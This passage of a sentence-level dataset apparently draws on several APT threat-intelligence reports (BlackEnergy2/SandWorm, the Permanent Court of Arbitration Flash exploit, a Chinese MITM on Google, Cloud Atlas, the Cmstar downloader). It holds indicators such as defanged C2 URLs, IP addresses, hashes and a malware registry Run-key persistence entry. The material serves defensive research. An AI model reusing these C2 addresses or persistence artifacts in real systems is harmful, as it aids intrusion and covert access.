"Over time we were able to collect several plugins as well as the main module for ARM and MIPS architectures .", "1200": "All of these ARM / MIPS object files were compiled from the same source and later pushed out in one config : \" weap_msl \" , \" weap_mps \" , \" nm_hwi \" , \" nm_mps \" , \" weap_hwi \" , and \" nm_msl \" .", "1201": "It 's interesting that the BE2 developers upgraded the ddos plugin to version 2 , along with the nm_hwi , nm_mps , and nm_msl plugins .", "1202": "They simultaneously released version 5 of the weap_msl , weap_mps , and weap_hmi plugins .", "1203": "Those assignments were not likely arbitrary , as this group had developed BlackEnergy2 for several years in a professional and organized style .", "1204": "Here is the list of retrieved files and related functionality : The developers ' coding style differed across the ' Hook ' main module , the plugins , and the Windows main.dll .", "1205": "The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure .", "1206": "This structure obfuscation may be a rewrite effort to better modularize the code , but could also be intended to complicate analysis .", "1207": "Regardless , it is likely that different individuals coded the different plugins .", "1208": "So , the BE2 effort must have its own small team of plugin and multiplatform developers .", "1209": "This Linux module can process the following commands , some of which are similar to the Windows version .", "1210": "After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater attention to new BE2 samples and associated CnCs .", "1211": "During an extended period , we were able to collect many Windows plugins from different CnC servers , without ever noticing Linux plugins being downloaded as described above .", "1212": "It appears the BE2/SandWorm gang protected their servers by keeping their non - Windows hacker tools and plugins in separate servers or server folders .", "1213": "Finally , each CnC server hosts a different set of plugins , meaning that each server works with different victims and uses plugins based on its current needs .", "1214": "Here is the summary list of all known plugins at the moment .", "1215": "We are pretty sure that our list of BE2 tools is not complete .", "1216": "For example , we have yet to obtain the router access plugin , but we are confident that it exists .", "1217": "Evidence also supports the hypothesis that there is a decryption plugin for victim files ( see below ) .", "1218": "Our current collection represents the BE2 attackers ' capabilities quite well .", "1219": "Some plugins remain mysterious and their purpose is not yet clear , like ' usb ' and ' bios ' .", "1220": "Perhaps destructive , perhaps to further infect devices .", "1221": "We do n't know yet .", "1222": "It 's also interesting to point out another plugin \u2013 ' grc ' .", "1223": "In some of the BE2 configuration files , we can notice an value with a \" gid \" type .", "1224": "This number is an ID for the plus.google.com service and is used by the ' grc ' plugin to parse html .", "1225": "It then downloads and decrypts a PNG file .", "1226": "The decrypted PNG is supposed to contain a new CNC address , but we never observed one .", "1227": "We are aware of two related GooglePlus IDs .", "1228": "The first one , plus.google.com/115125387226417117030/ , contains an abnormal number of views .", "1229": "At the time of writing , the count is 75 million .", "1230": "The second one - plus.google.com/116769597454024178039/posts - is currently more modest at a little over 5,000 views .", "1231": "All of that account 's posts are deleted .", "1232": "During observation of the described above \" router - PC \" CnC we tracked the following commands delivered in the config file before the server went offline .", "1233": "Our observation of related actions here .", "1234": "We want to pay special attention to the DDoS commands meant for these routers .", "1235": "188.128.123.52 belongs to the Russian Ministry of Defense and 212.175.109.10 belongs to the Turkish Ministry of Interior 's government site .", "1236": "While many researchers suspect a Russian actor is behind BE2 , judging by their tracked activities and the victim profiles , it 's still unclear whose interests they represent .", "1237": "While observing some other CnCs and pulling down config files , we stumbled upon some strange mistakes and mis - typing .", "1238": "They are highlighted in the image below .", "1239": "First , these mistakes suggest that the BE2 attackers manually edit these config files .", "1240": "Secondly , it shows that even skilled hackers make mistakes .", "1241": "The contents of the config files themselves are fairly interesting .", "1242": "They all contain a callback c2 with a hardcoded ip address , some contain timeouts , and some contain the commands listed above .", "1243": "We include a list of observed hardcoded ip C2 addresses here , along with the address owner and geophysical location of the host .", "1244": "It 's interesting that one of these servers is a Tor exit node .", "1245": "And , according to the collected config files , the group upgraded their malware communications from plain text http to encrypted https in October 2013 .", "1246": "BlackEnergy2 victims are widely distributed geographically .", "1247": "We identified BlackEnergy2 targets and victims in the following countries starting in late 2013 .", "1248": "There are likely more victims .", "1249": "Victim profiles point to an expansive interest in ICS .", "1250": "However , we also noticed that the target list includes government , property holding , and technology organizations as well .", "1251": "We gained insight into significant BE2 victim profiles over the summer of 2014 .", "1252": "Interesting BE2 incidents are presented here .", "1253": "This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension .", "1254": "The attached exe file turned out to be ' BlackEnergy - like ' malware , which researchers already dubbed ' BlackEnergy3 ' - the gang uses it along with BlackEnergy2 .", "1255": "Kaspersky Lab detects ' BlackEnergy3 ' malware as Backdoor . Win32.Fonten \u2013 naming it after its dropped file \" FONTCACHE.DAT \" When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first - stage tool on this network .", "1256": "The config files within BE2 contained the settings of the company 's internal web proxy .", "1257": "After decrypting these files , we could retrieve plugins launched on infected machines : ps , vsnet , fs , ss , dstr .", "1258": "Some machines already launched the plugin , lost their data and became unbootable .", "1259": "Also , on some machines , documents were encrypted , but no related plugin could be found .", "1260": "The second organization was hacked via the first victim 's stolen VPN credentials .", "1261": "After the second organization was notified about the infection they started an internal investigation .", "1262": "They confirmed that some data was destroyed on their machines , so the BE2 attackers have exhibited some level of destructive activity .", "1263": "They were n't able to connect to the routers any more by telnet and found the following \" farewell \" tcl scripts in the router 's file system .", "1264": "Ciscoapi.tcl \u2013 contains various wrappers over cisco EXEC - commands as described in the comments .", "1265": "The comment includes a punchy message for \" kasperRsky \" .", "1266": "Killint.tcl \u2013 uses Ciscoapi.tcl , implements destroying functions .", "1267": "The organization managed to discover what scripts were hosted on the server before BE / SandWorm gang deleted them , and unfortunately could n't restore them after they were deleted .", "1268": "The BE2 actor performs careful , professional activity covering their tracks .", "1269": "There is evidence that the logs produced by some scripts were also stored on the FTP server , in particular the information on CDP neighbors which is provided by one of the procedures of ciscoapi.tcl .", "1270": "The third organization got compromised by the same type of attack as the first one ( an EXE file spoofing a doc within a Zip archive ) .", "1271": "All the plugins discovered in BE2 files were known , and there was no revelation of hacked network devices on their side and no destroyed data .", "1272": "The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL .", "1273": "hxxps://46.165.222(dot)28/upgrade / f3395cd54cf857ddf8f2056768ff49ae / getcfg.php The URL contains the md5 of the string ' router ' .", "1274": "One of the discovered config files contained a URL with an as yet unidentified md5 .", "1275": "hxxps://46.165.222(dot)28/upgrade / bf0dac805798cc1f633f19ce8ed6382f / upgrade.php A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy .", "1276": "They are all detected as variants of \" Backdoor . Win32.Blakken \" .", "1277": "Each config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators .", "1278": "Currently this particular BE / SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters , as follows .", "1279": "0C0703hji The numbers indicate the date of file creation in the format : Year - Month - Day .", "1280": "Still , the purpose of the letters is unknown , but most likely it indicates the targets .", "1281": "The hex numbers were n't used all the time , sometimes we observed decimal numbers .", "1282": "100914_mg 100929nrT Most interesting for us was the earliest build i d we could find .", "1283": "Currently it is \" OB020Ad0V \" , meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010 .", "1284": "The driver is self - signed on 64-bit systems However , new \" APT \" BE2 uses one of the following filenames that are used as an encrypted storage for plugins and the network settings .", "1285": "They are consistent and serve as stable IoC.", "1286": "Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\flashplayerapp.exe BE3 uses the following known filenames .", "1287": "% USERPROFILE%\\NTUSER.LOG % LOCALAPPDATA%\\FONTCACHE.DAT BE2 MD5s .", "1288": "BE3 MD5s .", "1289": "Botnet History Illustrated by BlackEnergy 2 , PH Days , Kaspersky Lab - Maria Garnaeva and Sergey Lozhkin , May 2014 BlackEnergy and Quedagh ( pdf ) , F - Secure , September 2014 Sandworm , iSIGHT Partners , October 2014 Alert ( ICS - ALERT-14 - 281 - 01A ) Ongoing Sophisticated Malware Campaign Compromising ICS ( Update A ) , ICS - CERT , October 2014", "1290": "In early July 2015 , Chinese APT actors used an Adobe Flash Player exploit within a specific webpage detailing a noteworthy international legal case between the Philippines and China .", "1291": "This precedent setting legal case would be followed by many Southeast Asian nations , as well as others around the globe .", "1292": "The exploit appeared on day three of the Permanent Court of Arbitration tribunal , exposing an untold number of interested parties that visited the webpage to potential exploitation .", "1293": "When considered holistically , the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering .", "1294": "Despite Beijing 's unwillingness to participate in the international arbitration and their rejection of the PCA 's jurisdiction , there appears to be a distinct effort to surreptitiously target those who are interested in this landmark international legal case via electronic means .", "1295": "ThreatConnect has shared the details of this incident to our Common Community within Incident 20150710D : Permanent Court of Arbitration Flash Exploit .", "1296": "Log into your ThreatConnect account or register for one via our Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market .", "1297": "Since the revelation of an Adobe Flash Player zero day exploit exposed as part of the leaked \" Hacking Team \" arsenal on July 6th 2015 ( designated CVE-2015 - 5119 ) , the ThreatConnect Intelligence Research Team has been monitoring its adoption by other malicious actors that are not tied to \" Hacking Team \" .", "1298": "On Thursday , July 9 , 2015 ThreatConnect observed that a CVE-2015 - 5119 exploit was embedded strategically within the website for the Permanent Court of Arbitration ( PCA ) , 72 hours after the exploit was disclosed publicly .", "1299": "The significance of this is that the PCA is an \" intergovernmental organization providing a variety of dispute resolution services to the international community \" located at the \" Peace Palace \" within The Hague , Netherlands .", "1300": "The 102-year - old Peace Palace is a historic fixture within the sphere of international law because it also houses the International Court of Justice , the principal judicial body of the United Nations , as well as other bodies and resources that uphold and support international laws and norms to which many nations adhere .", "1301": "The exploit was posted to the PCA website during the first round of arguments of a notable international legal case where the Philippines is contesting Chinese territorial expansion within the South China Sea ( SCS ) , specifically challenging encroachment into the Philippines exclusive economic zone ( EEZ ) .", "1302": "These arbitral proceedings were initially instituted by the Republic of the Philippines against the People 's Republic of China under Annex VII of the United Nations Convention on the Law of the Sea ( UNCLOS ) on January 22 , 2013 .", "1303": "Two years later , on July 09 , 2015 , an attacker compromised the official PCA webpages at .", "1304": "This exploitation was almost certainly not a random compromise of the PCA website ; rather , it occurred during the initial phase of the legal proceedings .", "1305": "The exploit itself was embedded within the very pages that specifically described the legal case of The Republic of the Philippines v.", "1306": "The People 's Republic of China .", "1307": "According to URLQuery , the attackers placed a CVE-2015 - 5119 Flash Exploit at the malicious URL [ http:]//pic.nicklockluckydog[.]org / movie.swf , and altered the PCA webpages to load that URL when visited .", "1308": "The domain pic.nicklockluckydog[.]org resolved to the IP address 192.243.116[.]241 ( Phoenix , Arizona , US ) at the time of initial exploitation .", "1309": "IP Address 192.243.116[.]241 is owned by IT7 Networks , Inc. , which provides self - managed Virtual Private Server ( VPS ) infrastructure .", "1310": "The attackers shifted the domain later , resolving to IP Address 108.61.117[.]9 ( Haarlem , Netherlands ) on Friday , July 10th , the very day that the tribunal convened in The Hague .", "1311": "The malware payload associated with this exploit has been identified as MD5 : B4522D05A9E3A034AF481A7797A445EA ( Rdws.exe ) .", "1312": "This payload is a dropper executable that deploys its main malware component using a dynamic link library ( DLL ) sideloading technique , where a malicious DLL is dropped alongside a legitimate program executable that will load that malicious DLL by filename .", "1313": "In this instance , the attackers leveraged the legitimate Google Chrome Frame Helper executable MD5 .", "1314": "DFDC5B09C4DEA79EB7F5B9E4E76EECF9 ( LMS.exe ) with the malicious sideload DLL file MD5 : 2EE25DE7BD6A2705F3F8DDE0DD681E96 ( dbghelp.dll ) .", "1315": "The domain ssl.nicklockluckydog[.]org resolved to 175.45.233[.]205 ( Seoul , South Korea ) at the time of analysis .", "1316": "ThreatConnect also uncovered a related malware sample MD5 : 5877D15215B7F398319F0DE7BA7B1947 , which was submitted to Malwr.com on July 15 , 2015 .", "1317": "This malware implant matches the type used above , and leverages the C2 domains books.blueworldlink2015[.]net and vpn.nicklockluckydog[.]org .", "1318": "The former domain resolves to the same Netherlands IP 108.61.117[.]9 which resolved pic.nicklockluckydog[.]org on July 10th .", "1319": "blueworldlink2015[.]net was registered by the email address nicklock2004[@]aol[.]com , which noticeably uses the same \" nicklock \" pseudonym found in the domain nicklockluckydog[.]org , and uses the falsified address info \" zhongguohunansheng \" Beijing , China .", "1320": "The domain nicklockluckydog[.]org was registered on July 9th , 2015 at 06:22Z by a Chinese domain reseller using falsified information such as the name Lanny Chen and address 7946 N Bridle Creek Way in Xiamen , Taiwan .", "1321": "On an interesting note , the registration address 7946 N Bridle Creek Way is the same observed within a civil suit between the National Football League and various Chinese domain resellers originally filed in May 2014 .", "1322": "In early July 2015 , Chinese APT actors would operationalize an Adobe Flash Player exploit within 72 hours of its public disclosure , strategically staging it within a specific webpage detailing a noteworthy international legal case between the Philippines and China .", "1323": "This precedent setting legal case would be followed by many Southeast Asian nations , as well as those around the globe .", "1324": "The exploit appeared during the first round of hearings , exposing an untold number of interested parties that visited the webpage .", "1325": "The tactic of leveraging strategic website compromises with patched or unpatched exploits is a well known observable which has been used consistently by various APT groups in recent years .", "1326": "When considered holistically , the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering .", "1327": "Manila has long recognized they are unable to independently lock horns with China diplomatically or militarily , by invoking dispute settlement procedures under the UNCLOS , an agreement in which both China and the Philippines are signatories .", "1328": "The Philippines is seeking to leverage international law to level the playing field against China 's regional diplomatic and military dominance , the ultimate goal being to deter aggressive Chinese expansion activities within the Philippine EEZ and the broader South China Sea .", "1329": "Despite Beijing 's unwillingness to participate in the international arbitration and their rejection of the PCA 's jurisdiction , there appears to be a distinct effort to surreptitiously monitor those who are interested in this landmark international legal case via electronic means .", "1330": "This vignette also highlights the critical difference between threat data and threat intelligence .", "1331": "The latter goes beyond simply pulling in a stream of open source indicators and blindly pushing them to your enterprise network security devices and SIEM tools hoping something hits ( it works great ; you 'll get TONS of hits \u2026 or misses , depending on your perspective ) .", "1332": "A true Threat Intelligence Platform enables tactical , operational , and strategic analysis of the details behind the technical how within the context of the non- technical , socio - political why .", "1333": "ThreatConnect has previously shared Threat Intelligence research of espionage activity tied to the increasing tensions within the South China Sea .", "1334": "In a similar fashion , ThreatConnect has shared additional details of this incident to our Common Community within Incident 20150710D : Permanent Court of Arbitration Flash Exploit .", "1335": "Log into your ThreatConnect account or register for one via our Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market .", "1336": "We 've performed technical analysis of the attack , on request from GreatFire.org , and can confirm that it is a real SSL MITM against www.google.com and that it is being performed from within China .", "1337": "We were contacted by GreatFire.org yesterday ( September 3 ) with a request to analyze two packet captures from suspected MITM - attacks before they finalized their blog post .", "1338": "The conclusions from our analysis is now published as part of GreatFire.org 's great blog post titled \" Authorities launch man - in - the- middle attack on Google \" .", "1339": "In their blog post GreatFire.org write .", "1340": "From August 28 , 2014 reports appeared on Weibo and Google Plus that users in China trying to access google.com and google.com.hk via CERNET , the country 's education network , were receiving warning messages about invalid SSL certificates .", "1341": "The evidence , which we include later in this post , indicates that this was caused by a man - in - the - middle attack .", "1342": "While the authorities have been blocking access to most things Google since June 4th , they have kept their hands off of CERNET , China 's nationwide education and research network .", "1343": "However , in the lead up to the new school year , the Chinese authorities launched a man - in - the - middle ( MITM ) attack against Google .", "1344": "Our network forensic analysis was performed by investigating the following to packet capture files .", "1345": "The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .", "1346": "We do not disclose the client IP addresses for privacy reasons , but they both seem legit ; one from Peking University ( netname PKU6-CERNET2 ) and the other from Chongqing University ( CQU6-CERNET2 ) .", "1347": "Both IP addresses belong to AS23910 , named \" China Next Generation Internet CERNET2 \" .", "1348": "The IP addresses received for www.google.com were in both cases also legit , so the MITM was n't carried out through DNS spoofing .", "1349": "The Peking University client connected to 2607:f8b0:4007:804::1013 ( GOOGLE - IPV6 in United States ) and the connection from Chongqing University went to 2404:6800:4005:805::1010 ( GOOGLE_IPV6_AP-20080930 in Australia ) .", "1350": "The Time - To - Live ( TTL ) values received in the IP packets from www.google.com were in both cases 248 or 249 ( note : TTL is actually called \" Hop Limit \" in IPv6 nomenclature , but we prefer to use the well established term \" TTL \" anyway ) .", "1351": "The highest possible TTL value is 255 , this means that the received packets haven't made more than 6 or 7 router hops before ending up at the client .", "1352": "However , the expected number of router hops between a server on GOOGLE - IPV6 and the client at Peking University is around 14 .", "1353": "The low number of router hops is is a clear indication of an IP MITM taking place .", "1354": "Here is an IPv6 traceroute from AS25795 in Los Angeles towards the IP address at Peking University ( generated with ARP Networks ' 4or6.com tool ) .", "1355": "This network is actually part of CERNET , but on AS23911 , which is the network that connects CERNET with its external peers .", "1356": "This means that the MITM attack is being conducted from within China .", "1357": "The round - trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .", "1358": "The expected round - trip time for connecting from CERNET to a Google server overseas would be around 150ms or more .", "1359": "However , in the captures we 've analyzed the TCP SYN+ACK package was received in just 8ms ( Peking ) and 52ms ( Chongqing ) respectively .", "1360": "The fast response times also indicate that the machine performing the MITM is located fairly close to the network at Peking University .", "1361": "Even though the machine performing the MITM was very quick at performing the TCP tree - way handshake we noticed that the application layer communication was terribly slow .", "1362": "The specification for the TLS handshake ( RFC 2246 ) defines that a ClientHello message should be responded to with a ServerHello .", "1363": "Google typically send their ServerHello response almost instantly , i.e.", "1364": "the response is received after one round - trip time ( 150ms in this case ) .", "1365": "However , in the analyzed captures we noticed ServerHello response times of around 500ms .", "1366": "We extracted the X.509 certificates from the two capture files to .cer files using NetworkMiner .", "1367": "We noticed that both users received identical certificates , which were both self signed for \" google.com \" .", "1368": "The fact that the MITM used a self signed certificate makes the attack easily detectable even for the non- technical user , since the web browser will typically display a warning about the site not being trusted .", "1369": "Additionally the X.509 certificate was created for \" google.com \" rather than \" * .google.com \" .", "1370": "This is an obvious miss from the MITM'ers side since they were attempting to MITM traffic to \" www.google.com \" but not to \" google.com \" .", "1371": "Certificate SHA1 fingerprint : f6beadb9bc02e0a152d71c318739cdecfc1c085d Certificate MD5 fingerprint : 66:D5:D5:6A : E9:28:51:7C:03:53:C5:E1:33:14:A8:3B A copy of the fake certificate is available on Google drive thanks to GreatFire.org .", "1372": "It looks as if the MITM is carried out on a network belonging to AS23911 , which is the outer part of CERNET that peers with all external networks .", "1373": "This network is located in China , so we can conclude that the MITM was being done within the country .", "1374": "It 's difficult to say exactly how the MITM attack was carried out , but we can dismiss DNS spoofing as the used method .", "1375": "An alternative to changing the router config would also be to add an in - line device that redirects the desired traffic to the SSL proxy .", "1376": "However , regardless of how they did it the attacker would be able to decrypt and inspect the traffic going to Google .", "1377": "We can also conclude that the method used to perform the MITM attack was similar to the Chinese MITM on GitHub , but not identical .", "1378": "Share | Short URL : http://netresec.com/?b=14955CB Posted by Erik Hjelmvik on Thursday , 04 September 2014 23:55:00 ( UTC / GMT )", "1379": "Two years ago , we published our research into RedOctober , a complex cyber-espionage operation targeting diplomatic embassies worldwide .", "1380": "We named it RedOctober because we started this investigation in October 2012 , an unusually hot month .", "1381": "After our announcement in January 2013 , the RedOctober operation was promptly shut down and the network of C & Cs was dismantled .", "1382": "As usually happens with these big operations , considering the huge investment and number of resources behind it , they do n't just '' go away '' forever .", "1383": "Normally , the group goes underground for a few months , redesigns the tools and the malware and resume operations .", "1384": "See : Since January 2013 , we 've been on the lookout for a possible RedOctober comeback .", "1385": "One possible hit was triggered when we observed Mevade , an unusual piece of malware that appeared late in 2013 .", "1386": "The Mevade C & C name styles as well as some other technical similarities indicated a connection to RedOctober , but the link was weak .", "1387": "It was n't until August 2014 that we observed something which made us wonder if RedOctober is back for good .", "1388": "In August 2014 , some of our users observed targeted attacks with a variation of CVE-2012-0158 and an unusual set of malware .", "1389": "We did a quick analysis of the malware and it immediately stood out because of certain unusual things that are not very common in the APT world .", "1390": "As we started digging into the operation , more details emerged which supported this theory .", "1391": "Perhaps the most unusual fact was that the Microsoft Office exploit did n't directly write a Windows PE backdoor on disk .", "1392": "The loader appears to be different every time and internal strings indicate it is '' polymorphically '' generated .", "1393": "According to their website , CloudMe is owned and operated by CloudMe AB , a company based in Link\u00f6ping , Sweden .", "1394": "( Important note : we do not believe that CloudMe is in any way related to the Cloud Atlas group - the attackers simply create free accounts on this provider and abuse them for command-and-control ) .", "1395": "Of course , it should be possible to reconfigure the malware to use any Cloud-based storage service that supports WebDAV .", "1396": "Just like with RedOctober , the top target of Cloud Atlas is Russia , followed closely by Kazakhstan , according to data from the Kaspersky Security Network ( KSN ) .", "1397": "Actually , we see an obvious overlap of targets between the two , with subtle differences which closely account for the geopolitical changes in the region that happened during the last two years .", "1398": "Both Cloud Atlas and RedOctober malware implants rely on a similar construct , with a loader and the final payload that is stored encrypted and compressed in an external file .", "1399": "There are some important differences though , especially in the encryption algorithms used \u2013 RC4 in RedOctober vs AES in Cloud Atlas .", "1400": "The usage of the compression algorithms in Cloud Altas and RedOctober is another interesting similarity .", "1401": "Both malicious programs share the code for LZMA compression algorithm .", "1402": "In CloudAtlas it is used to compress the logs and to decompress the decrypted payload from the C & C servers , while in Red October the '' scheduler '' plugin uses it to decompress executable payloads from the C & C .", "1403": "It turns out that the implementation of the algorithm is identical in both malicious modules , however the way it is invoked is a bit different , with additional input sanity checks added to the CloudAtlas version .", "1404": "Another interesting similarity between the malware families is the configuration of the build system used to compile the binaries .", "1405": "Every binary created using the Microsoft Visual Studio toolchain has a special header that contains information about the number of input object files and version information of the compilers used to create them , the '' Rich '' header called so by the magic string that is used to identify it in the file .", "1406": "We have been able to identify several RedOctober binaries that have '' Rich '' headers describing exactly the same layout of VC 2010 + VC 2008 object files .", "1407": "Although this does n't necessarily mean that the binaries were created on the same development computer , they were definitely compiled using the same version of the Microsoft Visual Studio up to the build number version and using similar project configuration .", "1408": "To summarize the similarities between the two : Finally , perhaps the strongest connection comes from targeting .", "1409": "In at least one case , the victim 's computer was attacked only twice in the last two years , with only two malicious programs \u2013 RedOctober and Cloud Atlas .", "1410": "These and other details make us believe that CloudAtlas represents a rebirth of the RedOctober attacks .", "1411": "Following big announcements and public exposures of targeted attack operations , APT groups behave in a predictable manner .", "1412": "Other groups that are more nervous about exposure go in a hibernation mode for months or years .", "1413": "Some may never return using the same tools and techniques .", "1414": "However , when a major cyber-espionage operation is exposed , the attackers are unlikely to completely shut down everything .", "1415": "They simply go offline for some time , completely reshuffle their tools and return with rejuvenated forces .", "1416": "We believe this is also the case of RedOctober , which makes a classy return with Cloud Atlas .", "1417": "Kaspersky products detect the malware from the Cloud Atlas toolset with the following verdicts : Blue Coat Exposes Inception Framework", "1418": "This specific downloader , Cmstar , is associated with the Lurid downloader also known as ' Enfal ' .", "1419": "Cmstar was named for the log message ' CM * * ' used by the downloader .", "1420": "Unit 42 is aware of threat actors using two toolkits \u2013 MNKit and the Tran Duy Linh toolkit \u2013 to produce malicious documents that exploit CVE-2012 - 0158 in order to implant Cmstar .", "1421": "The Cmstar downloader itself has several unique and interesting features , as well as substantial infrastructure overlap with other tools worth discussing .", "1422": "The Cmstar downloader starts by manually building its import address table ( IAT ) , much like shellcode would ; however , it uses a rather unique technique .", "1423": "The payload pairs several comma - separated lists of characters with comma - separated lists of numbers .", "1424": "Each list of characters consists of the set found within the API function name the payload seeks to add to its IAT , while the corresponding list of numbers specifies the offset in the function name where those characters should be placed .", "1425": "For example , if the payload has \" D , e , A \" paired with \" 0,5,19 \" , this results in the following mapping .", "1426": "The payload loads a specific Windows library 's EAT by calling the ImageDirectoryEntryToData API function using the IMAGE_DIRECTORY_ENTRY_EXPORT flag .", "1427": "It then enumerates the library 's EAT to find exported function names by checking each function name for the character and the specific offset .", "1428": "Once found , the payload adds the address for the specific API function to its IAT .", "1429": "For instance , the payload checks the EAT of \" wininet.dll \" using the comparisons mentioned above to find the address to the \" DeleteUrlCacheEntryA \" API function .", "1430": "One specific Cmstar payload that we analyzed used the character / offsets seen in Figure 1 to locate the API functions within three different Windows libraries to build its IAT .", "1431": "After manually creating the IAT , Cmstar decrypts its configuration , several encrypted strings , and a piece of shellcode .", "1432": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xpsfiltsvcs : \" rundll32.exe C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\xpsfiltsvcs.dll , XpsRegisterServer \" Unit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after reboots .", "1433": "However , the code does not decrypt , reference , or use the following registry key in any way , which suggests that the malware author left this artifact in the code after swapping to the run key listed above .", "1434": "http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi It should be noted that the C2 URL contains the string ' cgl - bin ' , which visually resembles the common cgi- bin folder used by many webservers to run server - side scripts .", "1435": "Unit 42 used the Palo Alto Networks AutoFocus threat intelligence service to locate additional samples using the ' cgl - bin ' string within URLs of HTTP requests and found several samples of the Cmwhite tool associated with the LURID / Enfal downloader1 , as seen in Figure 2 .", "1436": "< Windows Version number>@@<CPU Architecture ( 2 for x64 , 1 for x86)>??<boolean for elevated privileges>]]**<boolean if antivirus processes are found>!!<static version string>== In one example , Unit 42 observed the following data within an analysis environment , which was then encrypted using a single - byte XOR algorithm and a key of 0x45 before being sent to the C2 server .", "1437": "The log messages are abbreviated strings that describe specific activities during the execution of the code .", "1438": "For instance , the downloader uses the CreateMutex to create a mutex named ' { 53A4988C - F91F-4054 - 9076 - 220AC5EC03F3 } ' to determine if another instance of the code is running .", "1439": "If the downloader determines another instance of itself is running , the code writes the string ' CM * * ' \u2013 which happens to be the basis for the name of the Trojan \u2013 to the log file .", "1440": "Unit 42 created a Yara signature to detect Cmstar samples based on these debugging strings , which is available in the appendix .", "1441": "One such piece of information is the existence of specific running processes .", "1442": "Many malware families and tools check for the existence of antivirus , but the Cmstar tool does so in a clever way .", "1443": "Rather than including a list of strings of associated processes , Cmstar enumerates the running processes and subjects these process names to a hashing algorithm .", "1444": "The results of this algorithm are then compared against three static values : 0x1E00AFA , 0xBEE091E8 and 0xD46FCDFA .", "1445": "Unit 42 reverse engineered the algorithm and created the function seen below to generate hashes in order to determine the processes Cmstar is trying to find .", "1446": "If the Trojan finds processes whose hash matches the three values mentioned earlier , it sets a boolean value ( the character ' 1 ' ) within the data sent to the C2 server and continues carrying out its functionality .", "1447": "Rather than altering its activities , Cmstar only notifies the C2 server if a system is running one of these processes , suggesting that the threat actors might employ this technique as a filtering mechanism to ignore analysis systems and researchers .", "1448": "In order to determine the intrusion set involved with the Cmstar , Unit 42 enumerated infrastructure used by the downloader for its C2 servers .", "1449": "The related infrastructure chart in Figure 3 shows a rather large cluster of related entities with one small set of entities that do not share any related entities with the larger cluster .", "1450": "As seen in the chart above , the C2 domain ' happy.launchtrue[.]com ' was originally registered using the email address ' WANGMINGHUA6@GMAIL[.]COM ' .", "1451": "When Unit 42 used the Palo Alto Networks AutoFocus threat intelligence service to locate additional Cmstar samples , we found several with C2 domains that also had the same original registrant .", "1452": "The only known Cmstar C2 domain not initially registered by the email address was help.ubxpi0s[.]com .", "1453": "Further analysis revealed that additional domains related to Cmstar C2 domains were also originally registered using the email address ' WANGMINGHUA6@GMAIL[.]COM ' and updated to the current information within a few days .", "1454": "In addition , this was the original registrant for C2 domain used in our Google Code blog2 , indicating this registrant email is likely a re - seller , and/or someone who initially sets up infrastructure for particular APT threat actors .", "1455": "The rest of the domains related to the Cmstar infrastructure did not use the original registrant noted above , but instead kept the same information initially used to register them .", "1456": "The difference in domain registration patterns could indicate threat actor preference , or could indicate there are at least two groups using this malware whose infrastructure at times overlaps .", "1457": "Interestingly , the updated registrant information ( or original , in the cases where it was n't changed ) for all of the C2 domains in this blog has also been used to register scam sites , most purporting to sell knock - off designer products like shoes , software , or cell phones .", "1458": "The contact emails and contact names can vary , but the address is re - used .", "1459": "Blue Coat noted this pattern as well in a blog published late last year , which also noted the ' WANGMINGHUA6@GMAIL[.]COM ' registrant email.3 It is not known whether the threat actors conducting the malicious activity are also behind the scam sites .", "1460": "Both of these features are noteworthy and may provide the ability to correlate future tools to the same group and/or malware authors .", "1461": "The URL used by Cmstar to communicate with its C2 server , as well as significant infrastructure overlap , show a direct relationship between the Cmstar downloader , Lurid / Enfal and Cmwhite tools .", "1462": "In a majority of the cases , threat actors using the Cmstar downloader initially register the C2 domains using the email address ' WANGMINGHUA6@GMAIL[.]COM ' and later change the registration information to include a different email address .", "1463": "Unit 42 can not positively confirm that the threat actors control the ' WANGMINGHUA6@GMAIL[.]COM ' email address , or if the email address belongs to a reseller that the threat actors buy domains from to create their infrastructure ; however , we do believe this is an interesting TTP worth tracking in future infrastructure enumeration .", "1464": "Known Cmstar Downloaders Delivery Documents Installing Cmstar", "1465": "It 's friday afternoon , I had a bit of free time and stumbled across this tweet by PhysicalDrive0 ( thx ! ) two hours ago and thought to give it a try to finally add a new article to this Blog ( first of 2014 ) : So , I went to Google to search for the domain of the Embassy of Greece Beijing and added the ( allegedly ) malicious java file package that was found by PhysicalDrive0 : Next , I loaded the 1.jar file into Java Decompiler to get the source code .", "1466": "It showed , that the functionality is obfuscated in some way , e.g .", "1467": "the function csfn ( String paramString ) decrypts all strings by '' removing '' the numbers of the string parameter : There are some other obfuscation techniques , but they are not important here .", "1468": "Instead , the following deobfuscated code line in the function init ( ) gives us an idea where the actual payload is located : We can also see , that the java package contains a file named pack , so we open 7-Zip and unpack the file .", "1469": "A quick view with a PE viewer showed , that it is a x86 PE executable not even encrypted ( SHA256 : b832e4b5a4829c8df6de7b42c5cb32ef25b5ab59072b4c2a7838404cd0dd5e5f ) : So , I opened IDA Pro to take a quick look at the functionality .", "1470": "Together with the strings of the executable , we get a brief idea of what the purpose of this malware is .", "1471": "To verify this , we open up Wireshark and run the executable .", "1472": "But first , we combine the C & C server and the HTTP request and open the URL in our favorite Browser : As you can see , there is a string named microsoft followed by Base64 encoded data .", "1473": "Side note : Is there also a Linux equivalent ? Next , we copy the Base64 encoded data and go to the following website to let us decode it into a file ( because I had the feeling it 's just 